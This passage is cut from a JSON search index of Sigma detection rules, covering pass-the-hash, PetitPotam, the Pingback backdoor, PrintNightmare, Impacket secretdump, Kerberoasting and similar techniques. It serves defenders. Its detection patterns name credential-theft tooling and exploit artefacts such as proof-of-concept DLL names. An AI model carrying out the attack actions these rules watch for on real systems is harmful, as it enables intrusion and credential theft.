\u0026#39;\\SYSTEM\\CurrentControlSet\\services\\null\\Instance\u0026#39; condition: selection falsepositives: - unknown level: critical fields: - EventID - CommandLine - ParentCommandLine - Image - User - TargetObject ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/registry_event/registry_event_apt_pandemic.yml/","tags":["attack.lateral_movement","attack.t1105"],"title":"Pandemic Registry Key"},{"categories":null,"contents":"Detects the attack technique pass the hash which is used to move laterally inside the network\nKnown false-positives Administrator activity Penetration tests References https://github.com/iadgov/Event-Forwarding-Guidance/tree/master/Events Raw rule (edit) title: Pass the Hash Activity id: f8d98d6c-7a07-4d74-b064-dd4a3c244528 status: test description: Detects the attack technique pass the hash which is used to move laterally inside the network author: Ilias el Matani (rule), The Information Assurance Directorate at the NSA (method) references: - https://github.com/iadgov/Event-Forwarding-Guidance/tree/master/Events date: 2017/03/08 modified: 2021/11/27 logsource: product: windows service: security definition: The successful use of PtH for lateral movement between workstations would trigger event ID 4624, a failed logon attempt would trigger an event ID 4625 detection: selection: EventID: - 4624 - 4625 LogonType: \u0026#39;3\u0026#39; LogonProcessName: \u0026#39;NtLmSsp\u0026#39; WorkstationName: \u0026#39;%Workstations%\u0026#39; ComputerName: \u0026#39;%Workstations%\u0026#39; filter: TargetUserName: \u0026#39;ANONYMOUS LOGON\u0026#39; condition: selection and not filter falsepositives: - Administrator activity - Penetration tests level: medium tags: - attack.lateral_movement - car.2016-04-004 - attack.t1550.002 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/builtin/security/win_pass_the_hash.yml/","tags":["attack.lateral_movement","car.2016-04-004","attack.t1550.002"],"title":"Pass the Hash Activity"},{"categories":null,"contents":"Detects password policy discovery commands\nKnown false-positives Legitimate administration activities References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1201/T1201.md https://attack.mitre.org/techniques/T1201/ https://linux.die.net/man/1/chage https://man7.org/linux/man-pages/man1/passwd.1.html https://superuser.com/questions/150675/how-to-display-password-policy-information-for-a-user-ubuntu Raw rule (edit) title: Password Policy Discovery id: ca94a6db-8106-4737-9ed2-3e3bb826af0a status: stable description: Detects password policy discovery commands author: Ömer Günal, oscd.community, Pawel Mazur date: 2020/10/08 modified: 2021/11/12 references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1201/T1201.md - https://attack.mitre.org/techniques/T1201/ - https://linux.die.net/man/1/chage - https://man7.org/linux/man-pages/man1/passwd.1.html - https://superuser.com/questions/150675/how-to-display-password-policy-information-for-a-user-ubuntu logsource: product: linux service: auditd detection: files: type: \u0026#39;PATH\u0026#39; name: - \u0026#39;/etc/pam.d/common-password\u0026#39; - \u0026#39;/etc/security/pwquality.conf\u0026#39; - \u0026#39;/etc/pam.d/system-auth\u0026#39; - \u0026#39;/etc/login.defs\u0026#39; chage: type: \u0026#39;EXECVE\u0026#39; a0: \u0026#39;chage\u0026#39; a1: - \u0026#39;--list\u0026#39; - \u0026#39;-l\u0026#39; passwd: type: \u0026#39;EXECVE\u0026#39; a0: \u0026#39;passwd\u0026#39; a1: - \u0026#39;-S\u0026#39; - \u0026#39;--status\u0026#39; condition: files or chage or passwd falsepositives: - Legitimate administration activities level: low tags: - attack.discovery - attack.t1201 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/linux/auditd/lnx_auditd_password_policy_discovery.yml/","tags":["attack.discovery","attack.t1201"],"title":"Password Policy Discovery"},{"categories":null,"contents":"Detects a when net.exe is called with a password in the command line\nKnown false-positives Unknown References Internal Research Raw rule (edit) title: Password Provided In Command Line Of Net.exe id: d4498716-1d52-438f-8084-4a603157d131 status: experimental description: Detects a when net.exe is called with a password in the command line references: - Internal Research author: Tim Shelton (HAWK.IO) date: 2021/12/09 logsource: category: process_creation product: windows detection: selection1: Image: C:\\Windows\\System32\\net.exe selection2: CommandLine|contains|all: - \u0026#39;net\u0026#39; - \u0026#39; use \u0026#39; - \u0026#39;:*\\\\\u0026#39; - \u0026#39;/USER:* *\u0026#39; filter: CommandLine|endswith: \u0026#39; \u0026#39; condition: all of selection* and not 1 of filter* falsepositives: - Unknown level: medium ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_net_use_password_plaintext.yml/","tags":null,"title":"Password Provided In Command Line Of Net.exe"},{"categories":null,"contents":"Detects value modification of registry key containing path to binary used as screensaver.\nKnown false-positives Legitimate modification of screensaver. References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1546.002/T1546.002.md https://www.welivesecurity.com/wp-content/uploads/2017/08/eset-gazer.pdf Raw rule (edit) title: Path To Screensaver Binary Modified id: 67a6c006-3fbe-46a7-9074-2ba3b82c3000 status: test description: Detects value modification of registry key containing path to binary used as screensaver. author: Bartlomiej Czyz @bczyz1, oscd.community references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1546.002/T1546.002.md - https://www.welivesecurity.com/wp-content/uploads/2017/08/eset-gazer.pdf date: 2020/10/11 modified: 2021/11/27 logsource: category: registry_event product: windows detection: selection: TargetObject|endswith: \u0026#39;\\Control Panel\\Desktop\\SCRNSAVE.EXE\u0026#39; # HKEY_CURRENT_USER\\Control Panel\\Desktop\\SCRNSAVE.EXE filter: Image|endswith: - \u0026#39;\\rundll32.exe\u0026#39; - \u0026#39;\\explorer.exe\u0026#39; condition: selection and not filter falsepositives: - \u0026#39;Legitimate modification of screensaver.\u0026#39; level: medium tags: - attack.persistence - attack.privilege_escalation - attack.t1546.002 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/registry_event/registry_event_modify_screensaver_binary_path.yml/","tags":["attack.persistence","attack.privilege_escalation","attack.t1546.002"],"title":"Path To Screensaver Binary Modified"},{"categories":null,"contents":"Detects processes loading modules related to PCRE.NET package\nKnown false-positives Unknown References https://twitter.com/rbmaslen/status/1321859647091970051 https://twitter.com/tifkin_/status/1321916444557365248 Raw rule (edit) title: PCRE.NET Package Image Load id: 84b0a8f3-680b-4096-a45b-e9a89221727c description: Detects processes loading modules related to PCRE.NET package status: experimental date: 2020/10/29 modified: 2021/08/14 author: Roberto Rodriguez (Cyb3rWard0g), OTR (Open Threat Research) tags: - attack.execution - attack.t1059 references: - https://twitter.com/rbmaslen/status/1321859647091970051 - https://twitter.com/tifkin_/status/1321916444557365248 logsource: category: image_load product: windows detection: selection: ImageLoaded|contains: \\AppData\\Local\\Temp\\ba9ea7344a4a5f591d6e5dc32a13494b\\ condition: selection falsepositives: - Unknown level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/image_load/image_load_pcre_net_load.yml/","tags":["attack.execution","attack.t1059"],"title":"PCRE.NET Package Image Load"},{"categories":null,"contents":"Detects processes creating temp files related to PCRE.NET package\nKnown false-positives Unknown References https://twitter.com/rbmaslen/status/1321859647091970051 https://twitter.com/tifkin_/status/1321916444557365248 Raw rule (edit) title: PCRE.NET Package Temp Files id: 6e90ae7a-7cd3-473f-a035-4ebb72d961da description: Detects processes creating temp files related to PCRE.NET package status: experimental date: 2020/10/29 modified: 2021/08/14 author: Roberto Rodriguez (Cyb3rWard0g), OTR (Open Threat Research) tags: - attack.execution - attack.t1059 references: - https://twitter.com/rbmaslen/status/1321859647091970051 - https://twitter.com/tifkin_/status/1321916444557365248 logsource: category: file_event product: windows detection: selection: TargetFilename|contains: \\AppData\\Local\\Temp\\ba9ea7344a4a5f591d6e5dc32a13494b\\ condition: selection falsepositives: - Unknown level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/file_event/file_event_win_pcre_net_temp_file.yml/","tags":["attack.execution","attack.t1059"],"title":"PCRE.NET Package Temp Files"},{"categories":null,"contents":"Detect lateral movement using GPO scheduled task, usually used to deploy ransomware at scale\nKnown false-positives if the source IP is not localhost then it\u0026rsquo;s super suspicious, better to monitor both local and remote changes to GPO scheduledtasks References https://twitter.com/menasec1/status/1106899890377052160 https://www.secureworks.com/blog/ransomware-as-a-distraction Raw rule (edit) title: Persistence and Execution at Scale via GPO Scheduled Task id: a8f29a7b-b137-4446-80a0-b804272f3da2 status: test description: Detect lateral movement using GPO scheduled task, usually used to deploy ransomware at scale author: Samir Bousseaden references: - https://twitter.com/menasec1/status/1106899890377052160 - https://www.secureworks.com/blog/ransomware-as-a-distraction date: 2019/04/03 modified: 2021/11/27 logsource: product: windows service: security definition: \u0026#39;The advanced audit policy setting \u0026#34;Object Access \u0026gt; Audit Detailed File Share\u0026#34; must be configured for Success/Failure\u0026#39; detection: selection: EventID: 5145 ShareName: \\\\\\*\\SYSVOL RelativeTargetName|endswith: \u0026#39;ScheduledTasks.xml\u0026#39; Accesses|contains: - \u0026#39;WriteData\u0026#39; - \u0026#39;%%4417\u0026#39; condition: selection falsepositives: - if the source IP is not localhost then it\u0026#39;s super suspicious, better to monitor both local and remote changes to GPO scheduledtasks level: high tags: - attack.persistence - attack.lateral_movement - attack.t1053.005 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/builtin/security/win_gpo_scheduledtasks.yml/","tags":["attack.persistence","attack.lateral_movement","attack.t1053.005"],"title":"Persistence and Execution at Scale via GPO Scheduled Task"},{"categories":null,"contents":"Detects the manipulation of persistent URLs which could execute malicious code\nKnown false-positives unknown References https://speakerdeck.com/heirhabarov/hunting-for-persistence-via-microsoft-exchange-server-or-outlook?slide=70 Raw rule (edit) title: Persistent Outlook Landing Pages id: 487bb375-12ef-41f6-baae-c6a1572b4dd1 description: Detects the manipulation of persistent URLs which could execute malicious code status: experimental references: - https://speakerdeck.com/heirhabarov/hunting-for-persistence-via-microsoft-exchange-server-or-outlook?slide=70 author: Tobias Michalski date: 2021/06/10 modified: 2022/03/05 tags: - attack.persistence - attack.t1112 logsource: product: windows category: registry_event detection: selection1: TargetObject|contains: - \u0026#39;Software\\Microsoft\\Office\\\u0026#39; - \u0026#39;\\Outlook\\Today\\\u0026#39; selectionStamp: EventType: SetValue TargetObject|endswith: Stamp Details: DWORD (0x00000001) selectionUserDefined: TargetObject|endswith: UserDefinedUrl filter_office: Image|startswith: - \u0026#39;C:\\Program Files\\Common Files\\Microsoft Shared\\ClickToRun\\\u0026#39; - \u0026#39;C:\\Program Files\\Common Files\\Microsoft Shared\\ClickToRun\\Updates\\\u0026#39; Image|endswith: \u0026#39;\\OfficeClickToRun.exe\u0026#39; condition: selection1 and (selectionStamp or selectionUserDefined) and not 1 of filter_* fields: - Details falsepositives: - unknown level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/registry_event/registry_event_outlook_registry_todaypage.yml/","tags":["attack.persistence","attack.t1112"],"title":"Persistent Outlook Landing Pages"},{"categories":null,"contents":"Detects the manipulation of persistent URLs which can be malicious\nKnown false-positives unknown References https://speakerdeck.com/heirhabarov/hunting-for-persistence-via-microsoft-exchange-server-or-outlook?slide=70 https://support.microsoft.com/en-us/topic/outlook-home-page-feature-is-missing-in-folder-properties-d207edb7-aa02-46c5-b608-5d9dbed9bd04?ui=en-us\u0026amp;rs=en-us\u0026amp;ad=us Raw rule (edit) title: Persistent Outlook Landing Pages id: ddd171b5-2cc6-4975-9e78-f0eccd08cc76 description: Detects the manipulation of persistent URLs which can be malicious status: experimental references: - https://speakerdeck.com/heirhabarov/hunting-for-persistence-via-microsoft-exchange-server-or-outlook?slide=70 - https://support.microsoft.com/en-us/topic/outlook-home-page-feature-is-missing-in-folder-properties-d207edb7-aa02-46c5-b608-5d9dbed9bd04?ui=en-us\u0026amp;rs=en-us\u0026amp;ad=us author: Tobias Michalski date: 2021/06/09 modified: 2022/02/09 tags: - attack.persistence - attack.t1112 logsource: product: windows category: registry_event detection: selection1: TargetObject|contains: - \u0026#39;\\Software\\Microsoft\\Office\\\u0026#39; - \u0026#39;\\Outlook\\WebView\\\u0026#39; TargetObject|endswith: \u0026#39;\\URL\u0026#39; selection2: TargetObject|contains: - \u0026#39;\\Calendar\\\u0026#39; - \u0026#39;\\Inbox\\\u0026#39; condition: selection1 and selection2 fields: - Details falsepositives: - unknown level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/registry_event/registry_event_outlook_registry_webview.yml/","tags":["attack.persistence","attack.t1112"],"title":"Persistent Outlook Landing Pages"},{"categories":null,"contents":"Detect suspicious Kerberos TGT requests. Once an attacer obtains a computer certificate by abusing Active Directory Certificate Services in combination with PetitPotam, the next step would be to leverage the certificate for malicious purposes. One way of doing this is to request a Kerberos Ticket Granting Ticket using a tool like Rubeus. This request will generate a 4768 event with some unusual fields depending on the environment. This analytic will require tuning, we recommend filtering Account_Name to the Domain Controller computer accounts.\nKnown false-positives False positives are possible if the environment is using certificates for authentication. We recommend filtering Account_Name to the Domain Controller computer accounts. References https://github.com/topotam/PetitPotam https://isc.sans.edu/forums/diary/Active+Directory+Certificate+Services+ADCS+PKI+domain+admin+vulnerability/27668/ https://github.com/splunk/security_content/blob/develop/detections/endpoint/petitpotam_suspicious_kerberos_tgt_request.yml Raw rule (edit) title: PetitPotam Suspicious Kerberos TGT Request id: 6a53d871-682d-40b6-83e0-b7c1a6c4e3a5 description: Detect suspicious Kerberos TGT requests. Once an attacer obtains a computer certificate by abusing Active Directory Certificate Services in combination with PetitPotam, the next step would be to leverage the certificate for malicious purposes. One way of doing this is to request a Kerberos Ticket Granting Ticket using a tool like Rubeus. This request will generate a 4768 event with some unusual fields depending on the environment. This analytic will require tuning, we recommend filtering Account_Name to the Domain Controller computer accounts. status: experimental author: Mauricio Velazco, Michael Haag date: 2021/09/02 modified: 2021/09/07 references: - https://github.com/topotam/PetitPotam - https://isc.sans.edu/forums/diary/Active+Directory+Certificate+Services+ADCS+PKI+domain+admin+vulnerability/27668/ - https://github.com/splunk/security_content/blob/develop/detections/endpoint/petitpotam_suspicious_kerberos_tgt_request.yml tags: - attack.credential_access - attack.t1187 logsource: product: windows service: security definition: \u0026#39;The advanced audit policy setting \u0026#34;Account Logon \u0026gt; Kerberos Authentication Service\u0026#34; must be configured for Success/Failure\u0026#39; detection: selection: EventID: 4768 TargetUserName|endswith: \u0026#39;$\u0026#39; CertThumbprint: \u0026#39;*\u0026#39; filter_local: IpAddress: \u0026#39;::1\u0026#39; filter_thumbprint: CertThumbprint: \u0026#39;\u0026#39; condition: selection and not 1 of filter_* falsepositives: - False positives are possible if the environment is using certificates for authentication. We recommend filtering Account_Name to the Domain Controller computer accounts. level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/builtin/security/win_petitpotam_susp_tgt_request.yml/","tags":["attack.credential_access","attack.t1187"],"title":"PetitPotam Suspicious Kerberos TGT Request"},{"categories":null,"contents":"Detects the use of Pingback backdoor that creates ICMP tunnel for C2 as described in the trustwave report\nKnown false-positives Very unlikely References https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/backdoor-at-the-end-of-the-icmp-tunnel https://app.any.run/tasks/4a54c651-b70b-4b72-84d7-f34d301d6406 Raw rule (edit) title: Pingback Backdoor id: 2bd63d53-84d4-4210-80ff-bf0658f1bf78 status: experimental description: Detects the use of Pingback backdoor that creates ICMP tunnel for C2 as described in the trustwave report author: Bhabesh Raj date: 2021/05/05 modified: 2021/09/09 references: - https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/backdoor-at-the-end-of-the-icmp-tunnel - https://app.any.run/tasks/4a54c651-b70b-4b72-84d7-f34d301d6406 tags: - attack.persistence - attack.t1574.001 logsource: product: windows category: file_event detection: selection: Image|endswith: updata.exe TargetFilename: \u0026#39;C:\\Windows\\oci.dll\u0026#39; condition: selection falsepositives: - Very unlikely level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/file_event/file_event_win_pingback_backdoor.yml/","tags":["attack.persistence","attack.t1574.001"],"title":"Pingback Backdoor"},{"categories":null,"contents":"Detects the use of Pingback backdoor that creates ICMP tunnel for C2 as described in the trustwave report\nKnown false-positives Very unlikely References https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/backdoor-at-the-end-of-the-icmp-tunnel https://app.any.run/tasks/4a54c651-b70b-4b72-84d7-f34d301d6406 Raw rule (edit) title: Pingback Backdoor id: 35a7dc42-bc6f-46e0-9f83-81f8e56c8d4b status: experimental description: Detects the use of Pingback backdoor that creates ICMP tunnel for C2 as described in the trustwave report author: Bhabesh Raj date: 2021/05/05 modified: 2021/09/09 references: - https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/backdoor-at-the-end-of-the-icmp-tunnel - https://app.any.run/tasks/4a54c651-b70b-4b72-84d7-f34d301d6406 tags: - attack.persistence - attack.t1574.001 logsource: product: windows category: image_load detection: selection: Image|endswith: \u0026#39;msdtc.exe\u0026#39; ImageLoaded: \u0026#39;C:\\Windows\\oci.dll\u0026#39; condition: selection falsepositives: - Very unlikely level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/image_load/image_load_pingback_backdoor.yml/","tags":["attack.persistence","attack.t1574.001"],"title":"Pingback Backdoor"},{"categories":null,"contents":"Detects the use of Pingback backdoor that creates ICMP tunnel for C2 as described in the trustwave report\nKnown false-positives Very unlikely References https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/backdoor-at-the-end-of-the-icmp-tunnel https://app.any.run/tasks/4a54c651-b70b-4b72-84d7-f34d301d6406 Raw rule (edit) title: Pingback Backdoor id: b2400ffb-7680-47c0-b08a-098a7de7e7a9 status: experimental description: Detects the use of Pingback backdoor that creates ICMP tunnel for C2 as described in the trustwave report author: Bhabesh Raj date: 2021/05/05 modified: 2021/09/09 references: - https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/backdoor-at-the-end-of-the-icmp-tunnel - https://app.any.run/tasks/4a54c651-b70b-4b72-84d7-f34d301d6406 tags: - attack.persistence - attack.t1574.001 logsource: product: windows category: process_creation detection: selection: ParentImage|endswith: \u0026#39;updata.exe\u0026#39; CommandLine|contains|all: - \u0026#39;config\u0026#39; - \u0026#39;msdtc\u0026#39; - \u0026#39;start\u0026#39; - \u0026#39;auto\u0026#39; condition: selection falsepositives: - Very unlikely level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_pingback_backdoor.yml/","tags":["attack.persistence","attack.t1574.001"],"title":"Pingback Backdoor"},{"categories":null,"contents":"Detects the modification of PortProxy registry key which is used for port forwarding. For command execution see rule win_netsh_port_fwd.yml.\nKnown false-positives WSL2 network bridge PowerShell script used for WSL/Kubernetes/Docker (e.g. https://github.com/microsoft/WSL/issues/4150#issuecomment-504209723) Synergy Software KVM (https://symless.com/synergy) References https://www.fireeye.com/blog/threat-research/2019/01/bypassing-network-restrictions-through-rdp-tunneling.html https://adepts.of0x.cc/netsh-portproxy-code/ https://www.dfirnotes.net/portproxy_detection/ Raw rule (edit) title: PortProxy Registry Key id: a54f842a-3713-4b45-8c84-5f136fdebd3c status: experimental description: Detects the modification of PortProxy registry key which is used for port forwarding. For command execution see rule win_netsh_port_fwd.yml. references: - https://www.fireeye.com/blog/threat-research/2019/01/bypassing-network-restrictions-through-rdp-tunneling.html - https://adepts.of0x.cc/netsh-portproxy-code/ - https://www.dfirnotes.net/portproxy_detection/ date: 2021/06/22 modified: 2021/09/13 tags: - attack.lateral_movement - attack.defense_evasion - attack.command_and_control - attack.t1090 author: Andreas Hunkeler (@Karneades) logsource: category: registry_event product: windows detection: selection_registry: TargetObject: \u0026#39;HKLM\\SYSTEM\\CurrentControlSet\\Services\\PortProxy\\v4tov4\\tcp\u0026#39; condition: selection_registry falsepositives: - WSL2 network bridge PowerShell script used for WSL/Kubernetes/Docker (e.g. https://github.com/microsoft/WSL/issues/4150#issuecomment-504209723) - Synergy Software KVM (https://symless.com/synergy) level: medium ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/registry_event/registry_event_portproxy_registry_key.yml/","tags":["attack.lateral_movement","attack.defense_evasion","attack.command_and_control","attack.t1090"],"title":"PortProxy Registry Key"},{"categories":null,"contents":"Detects command line parameter very often used with coin miners\nKnown false-positives Other tools that use a \u0026ndash;cpu-priority flag References https://xmrig.com/docs/miner/command-line-options Raw rule (edit) title: Possible Coin Miner CPU Priority Param id: 071d5e5a-9cef-47ec-bc4e-a42e34d8d0ed status: experimental description: Detects command line parameter very often used with coin miners author: Florian Roth date: 2021/10/09 references: - https://xmrig.com/docs/miner/command-line-options tags: - attack.privilege_escalation - attack.t1068 logsource: product: linux service: auditd detection: cmd1: a1|startswith: \u0026#39;--cpu-priority\u0026#39; cmd2: a2|startswith: \u0026#39;--cpu-priority\u0026#39; cmd3: a3|startswith: \u0026#39;--cpu-priority\u0026#39; cmd4: a4|startswith: \u0026#39;--cpu-priority\u0026#39; cmd5: a5|startswith: \u0026#39;--cpu-priority\u0026#39; cmd6: a6|startswith: \u0026#39;--cpu-priority\u0026#39; cmd7: a7|startswith: \u0026#39;--cpu-priority\u0026#39; condition: 1 of cmd* falsepositives: - Other tools that use a --cpu-priority flag level: critical ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/linux/auditd/lnx_auditd_coinminer.yml/","tags":["attack.privilege_escalation","attack.t1068"],"title":"Possible Coin Miner CPU Priority Param"},{"categories":null,"contents":"Detects events of driver load errors in print service logs that could be a sign of successful exploitation attempts of print spooler vulnerability CVE-2021-1675\nKnown false-positives Problems with printer drivers References https://github.com/hhlxf/PrintNightmare https://github.com/afwu/PrintNightmare https://twitter.com/fuzzyf10w/status/1410202370835898371 Raw rule (edit) title: Possible CVE-2021-1675 Print Spooler Exploitation id: 4e64668a-4da1-49f5-a8df-9e2d5b866718 description: Detects events of driver load errors in print service logs that could be a sign of successful exploitation attempts of print spooler vulnerability CVE-2021-1675 author: Florian Roth, KevTheHermit, fuzzyf10w status: experimental level: high references: - https://github.com/hhlxf/PrintNightmare - https://github.com/afwu/PrintNightmare - https://twitter.com/fuzzyf10w/status/1410202370835898371 date: 2021/06/30 modified: 2021/07/08 tags: - attack.execution - attack.t1569 - cve.2021.1675 logsource: product: windows service: printservice-admin detection: selection: EventID: - 808 # old id - 4909 # new id ErrorCode: - \u0026#39;0x45A\u0026#39; - \u0026#39;0x7e\u0026#39; keywords: - \u0026#39;The print spooler failed to load a plug-in module\u0026#39; # default file names used in PoC codes - \u0026#39;MyExploit.dll\u0026#39; - \u0026#39;evil.dll\u0026#39; - \u0026#39;\\addCube.dll\u0026#39; - \u0026#39;\\rev.dll\u0026#39; - \u0026#39;\\rev2.dll\u0026#39; - \u0026#39;\\main64.dll\u0026#39; - \u0026#39;\\mimilib.dll\u0026#39; - \u0026#39;\\mimispool.dll\u0026#39; condition: selection or keywords fields: - PluginDllName falsepositives: - Problems with printer drivers ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/builtin/printservice/win_exploit_cve_2021_1675_printspooler.yml/","tags":["attack.execution","attack.t1569","cve.2021.1675"],"title":"Possible CVE-2021-1675 Print Spooler Exploitation"},{"categories":null,"contents":"Detect AD credential dumping using impacket secretdump HKTL\nKnown false-positives pentesting References https://blog.menasec.net/2019/02/threat-huting-10-impacketsecretdump.html Raw rule (edit) title: Possible Impacket SecretDump Remote Activity id: 252902e3-5830-4cf6-bf21-c22083dfd5cf description: Detect AD credential dumping using impacket secretdump HKTL status: experimental author: Samir Bousseaden, wagga date: 2019/04/03 modified: 2021/06/27 references: - https://blog.menasec.net/2019/02/threat-huting-10-impacketsecretdump.html tags: - attack.credential_access - attack.t1003.002 - attack.t1003.004 - attack.t1003.003 logsource: product: windows service: security definition: \u0026#39;The advanced audit policy setting \u0026#34;Object Access \u0026gt; Audit Detailed File Share\u0026#34; must be configured for Success/Failure\u0026#39; detection: selection: EventID: 5145 ShareName: \\\\\\*\\ADMIN$ RelativeTargetName|contains|all: - \u0026#39;SYSTEM32\\\u0026#39; - \u0026#39;.tmp\u0026#39; condition: selection falsepositives: - pentesting level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/builtin/security/win_impacket_secretdump.yml/","tags":["attack.credential_access","attack.t1003.002","attack.t1003.004","attack.t1003.003"],"title":"Possible Impacket SecretDump Remote Activity"},{"categories":null,"contents":"Detect AD credential dumping using impacket secretdump HKTL. Based on the SIGMA rules/windows/builtin/win_impacket_secretdump.yml\nKnown false-positives unknown References https://blog.menasec.net/2019/02/threat-huting-10-impacketsecretdump.html Raw rule (edit) title: Possible Impacket SecretDump Remote Activity - Zeek id: 92dae1ed-1c9d-4eff-a567-33acbd95b00e status: test description: \u0026#39;Detect AD credential dumping using impacket secretdump HKTL. Based on the SIGMA rules/windows/builtin/win_impacket_secretdump.yml\u0026#39; author: \u0026#39;Samir Bousseaden, @neu5ron\u0026#39; references: - https://blog.menasec.net/2019/02/threat-huting-10-impacketsecretdump.html date: 2020/03/19 modified: 2021/11/27 logsource: product: zeek service: smb_files detection: selection: path|contains|all: - \u0026#39;\\\u0026#39; - \u0026#39;ADMIN$\u0026#39; name|contains: \u0026#39;SYSTEM32\\\u0026#39; name|endswith: \u0026#39;.tmp\u0026#39; condition: selection falsepositives: - \u0026#39;unknown\u0026#39; level: high tags: - attack.credential_access - attack.t1003.002 - attack.t1003.004 - attack.t1003.003 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/network/zeek/zeek_smb_converted_win_impacket_secretdump.yml/","tags":["attack.credential_access","attack.t1003.002","attack.t1003.004","attack.t1003.003"],"title":"Possible Impacket SecretDump Remote Activity - Zeek"},{"categories":null,"contents":"Detect PetitPotam coerced authentication activity.\nKnown false-positives Unknown. Feedback welcomed. References https://github.com/topotam/PetitPotam https://github.com/splunk/security_content/blob/0dd6de32de2118b2818550df9e65255f4109a56d/detections/endpoint/petitpotam_network_share_access_request.yml Raw rule (edit) title: Possible PetitPotam Coerce Authentication Attempt id: 1ce8c8a3-2723-48ed-8246-906ac91061a6 description: Detect PetitPotam coerced authentication activity. status: experimental author: Mauricio Velazco, Michael Haag date: 2021/09/02 references: - https://github.com/topotam/PetitPotam - https://github.com/splunk/security_content/blob/0dd6de32de2118b2818550df9e65255f4109a56d/detections/endpoint/petitpotam_network_share_access_request.yml tags: - attack.credential_access - attack.t1187 logsource: product: windows service: security definition: \u0026#39;The advanced audit policy setting \u0026#34;Object Access \u0026gt; Detailed File Share\u0026#34; must be configured for Success/Failure\u0026#39; detection: selection: EventID: 5145 ShareName|startswith: \u0026#39;\\\\\u0026#39; ShareName|endswith: \u0026#39;\\IPC$\u0026#39; RelativeTargetName: lsarpc SubjectUserName: ANONYMOUS LOGON condition: selection falsepositives: - Unknown. Feedback welcomed. level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/builtin/security/win_petitpotam_network_share.yml/","tags":["attack.credential_access","attack.t1187"],"title":"Possible PetitPotam Coerce Authentication Attempt"},{"categories":null,"contents":"Detects Loading of samlib.dll, WinSCard.dll from untypical process e.g. through process hollowing by Mimikatz\nKnown false-positives Very likely, needs more tuning References https://cyberwardog.blogspot.com/2017/03/chronicles-of-threat-hunter-hunting-for.html Raw rule (edit) title: Possible Process Hollowing Image Loading id: e32ce4f5-46c6-4c47-ba69-5de3c9193cd7 status: test description: Detects Loading of samlib.dll, WinSCard.dll from untypical process e.g. through process hollowing by Mimikatz author: Markus Neis references: - https://cyberwardog.blogspot.com/2017/03/chronicles-of-threat-hunter-hunting-for.html date: 2018/01/07 modified: 2021/11/27 logsource: category: image_load product: windows detection: selection: Image|endswith: - \u0026#39;\\notepad.exe\u0026#39; ImageLoaded|endswith: - \u0026#39;\\samlib.dll\u0026#39; - \u0026#39;\\WinSCard.dll\u0026#39; condition: selection falsepositives: - Very likely, needs more tuning level: high tags: - attack.defense_evasion - attack.t1574.002 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/image_load/image_load_susp_image_load.yml/","tags":["attack.defense_evasion","attack.t1574.002"],"title":"Possible Process Hollowing Image Loading"},{"categories":null,"contents":"Detects, possibly, malicious unauthorized usage of bcdedit.exe\nReferences https://docs.microsoft.com/en-us/windows-hardware/drivers/devtest/bcdedit--set https://twitter.com/malwrhunterteam/status/1372536434125512712/photo/2 Raw rule (edit) title: Possible Ransomware or Unauthorized MBR Modifications id: c9fbe8e9-119d-40a6-9b59-dd58a5d84429 status: experimental description: Detects, possibly, malicious unauthorized usage of bcdedit.exe references: - https://docs.microsoft.com/en-us/windows-hardware/drivers/devtest/bcdedit--set - https://twitter.com/malwrhunterteam/status/1372536434125512712/photo/2 author: \u0026#39;@neu5ron\u0026#39; date: 2019/02/07 modified: 2021/06/18 tags: - attack.defense_evasion - attack.t1070 - attack.persistence - attack.t1542.003 logsource: category: process_creation product: windows detection: selection: Image|endswith: \u0026#39;\\bcdedit.exe\u0026#39; CommandLine|contains: - \u0026#39;delete\u0026#39; - \u0026#39;deletevalue\u0026#39; - \u0026#39;import\u0026#39; - \u0026#39;safeboot\u0026#39; - \u0026#39;network\u0026#39; condition: selection level: medium ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_bcdedit.yml/","tags":["attack.defense_evasion","attack.t1070","attack.persistence","attack.t1542.003"],"title":"Possible Ransomware or Unauthorized MBR Modifications"},{"categories":null,"contents":"Detects Service Principal Name Enumeration used for Kerberoasting\nKnown false-positives Administrator Activity References https://p16.praetorian.com/blog/how-to-use-kerberoasting-t1208-for-privilege-escalation Raw rule (edit) title: Possible SPN Enumeration id: 1eeed653-dbc8-4187-ad0c-eeebb20e6599 status: test description: Detects Service Principal Name Enumeration used for Kerberoasting author: Markus Neis, keepwatch references: - https://p16.praetorian.com/blog/how-to-use-kerberoasting-t1208-for-privilege-escalation date: 2018/11/14 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection_image: Image|endswith: \u0026#39;\\setspn.exe\u0026#39; selection_desc: Description|contains|all: - \u0026#39;Query or reset the computer\u0026#39; - 